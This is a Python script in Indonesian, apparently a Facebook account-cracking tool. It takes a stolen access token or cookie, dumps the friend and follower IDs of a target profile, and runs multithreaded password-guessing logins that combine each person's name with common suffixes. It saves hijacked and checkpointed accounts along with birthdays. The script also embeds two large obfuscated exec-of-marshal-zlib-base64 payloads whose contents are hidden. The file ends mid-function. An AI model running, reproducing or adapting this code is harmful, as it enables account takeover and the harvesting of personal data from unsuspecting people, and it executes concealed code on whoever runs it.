#!/usr/bin/python3
#-*-coding:utf-8-*-

#######################################################
# Name                 : Recod                                                                                    #
# File                      : crack.py                                                                                #
# Author                : BOY HAMZAH                                                                      #
# Github                 : https://github.com/Boy-Tolkit                                           #
# Facebook           : https://www.facebook.com/SAYA.B0Y                            #
# Fansfage            : https://www.facebook.com/106751971481203             #
# Python version  : 2.9                                                                                          #
#######################################################
#                                       RATU ERROR PROJECTS                                           #
#    Thanks for : Angga,Azim,Dapunta,Rizal,Hamzah,Jesicca,Iqbal,Yayan    #
#######################################################


   ############# JANGAN DI UBAH ASU NANTI ERROR! #############



import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

try:
	import mechanize
except ImportError:
	os.system("pip install mechanize")
	os.system("python crack.py")
try:
	import requests
except ImportError:
	os.system("pip install requests")
	os.system("python crack.py")
try:
	import bs4
except ImportError:
	os.system("pip install bs4")
	os.system("python crack.py")

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
	
durasi = str(datetime.now().strftime("%d-%m-%Y"))
alamat_ip = requests.get("https://api.ipify.org").text

exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'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'))))

ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("\nCookie Salah")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

def logs():
  os.system("clear")
  banner()
  print(("\n1.) Login Token"))
  print(("2.) Login Cookies"))
  print(("3.) Update Script"))
  print(("0.) Keluar"))
  sek=input("\n> ")
  if sek=="":
    print(("\nSalah"))
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    updatesc()
  elif sek=="0":
    exit()
  else:
    print(("\nSalah"))
    logs()

def log_token():
    toket = input("\nToken > ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print(("\nBerhasil Masuk"))
        time.sleep(2)
        bot_follow()
    except KeyError:
        print(("\nToken Invalid"))
        time.sleep(2)
        os.system("clear")
        logs()

def gen():
        cookie = input("\nCookies > ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print(("\nTidak Ada Koneksi"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print(("\nBerhasil Masuk"))
        time.sleep(2)
        bot_follow()
        
exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'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'))))

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print(("\nBermasalah > %s"%e))
        time.sleep(2)
        logs()
    os.system("clear")
    banner()
    print(("\nHallo > [ "+a["name"]+ " ]"))
    print((""))
    print(("1.) Dump ID Publik"))
    print(("2.) Dump Followers"))
    print(("3.) Mulai Crack"))
    print(("0.) Keluar"))
    choose_menu()
	
def choose_menu():
	r=input("\n> ")
	if r=="":
		print(("\nSalah"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		pilihcrack()
	elif r=="0":
		try:
			jalan("\nTerimkasih Telah Memakai Script Aku")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print(("\nBermasalah > %s"%e))
	else:
		print(("\nSalah"))
		menu()	

def useragent():
    uz = input("\nIngin Menggunakan User Agent Manual/Otomotis [ m/o ]\n\n> ")
    if uz=="":
        print(("\nSalah"))
        menu()
    elif uz=="o":
        try:
            ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    elif uz=="m":
        try:
            ua = input("\nUser Agent > ")
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    else:
        print(("\nSalah"))
        menu()

def pilihcrack():
  print(("\n\t     Pilih Metode Crack Nya"))
  print((""))
  print(("1.) Metode b-api [ Fast Crack ]"))
  print(("2.) Metode mbasic [ Slow Crack ]"))
  krah=input("\n> ")
  if krah in[""]:
    print(("\nSalah"))
    pilihcrack()
  elif krah in["1","01"]:
    bapittl()
  elif krah in["2","02"]:
    crackttl()
  else:
    print(("\nSalah"))
    pilihcrack()

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("\nCookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input("\nID Publik > ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("Nama > "+op["name"]))
		except KeyError:
			print(("\nID Tidak Ada"))
			input(("\nTekan Enter Untuk Kembali"))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".recod").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("ID Yang Di Dapat > %s"%(len(id))))
		jalan("\nBerhasil Dump ID")
		print(("\nSalin Nama File > "+qq))
		input("\nTekan Enter Untuk Kembali")
		menu()	
	except Exception as e:
		exit("\nBermasalah > %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input("\nID Followers > ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("Nama > "+op["name"]))
		except KeyError:
			print(("\nID Tidak Ada"))
			input(("\nTekan Enter Untuk Kembali"))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".recod").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("ID Yang Di Dapat > %s"%(len(id))))
		jalan("\nBerhasil Dump ID Followers")
		print(("\nSalin Nama File > "+qq))
		input("\nTekan Enter Untuk Kembali")
		menu()
	except Exception as e:
		exit("\nBermasalah > %s"%e)

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
	return results

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crackttl:
	os.system("clear")
	banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(("\nIngin Menggunakan Sandi Manual/Otomotis [ m/o ]"))
		while True:
			f=input("\n> ")
			if f=="":continue
			elif f in["m","M"]:
				try:
					while True:
						try:
							self.apk=input("\nNama File > ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("%s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("%s"%e))
					continue
				print(("\n[ CONTOH SANDI ] sayang,pengen,ngentot"))
				self.pwlist()
				break
			elif f in["o","O"]:
				try:
					while True:
						try:
							self.apk=input("\nNama File > ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("%s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("%s"%e))
				print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input("\nSandi > ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r\033[0;92mOK %s - %s               "%(fl.get("id"),i)))
					self.ada.append("%s - %s"%(fl.get("id"),i))
					if fl.get("id") in open("results.txt").read():
						break
					else:
						open("results.txt","a+").write(
						"%s - %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\033[0;91mCP %s - %s - %s   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s - %s"%(fl.get("id"),i))
					open("check.txt","a+").write(
						"%s - %s - %s\n"%(fl.get("id"),i,str(ttl)))
					break
				else:continue
					
			self.ko+=1
			print("\r\033[0m%s-%s \033[0;92mOK %s \033[0;91mCP %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
		except:
			self.main(fl)

class bapittl:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print(("\nIngin Menggunakan Sandi Manual/Otomotis [ m/o ]"))
    while True:
      f=input("\n> ")
      if f in[""," "]:
        print(("\nSalah"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=input("\nNama File > ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(("%s"%e))
              continue
          self.fl=[]
          print(("\n[ CONTOH SANDI ] sayang,pengen,ngentot"))
          self.pw=input("\nSandi > ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("%s"%e))
          continue
        print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
        ThreadPool(35).map(self.brute,self.fl)
        exit()
        break
      elif f in["o","O"]:
        try:
          while True:
            try:
              self.apk=input("\nNama File > ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
        ThreadPool(35).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
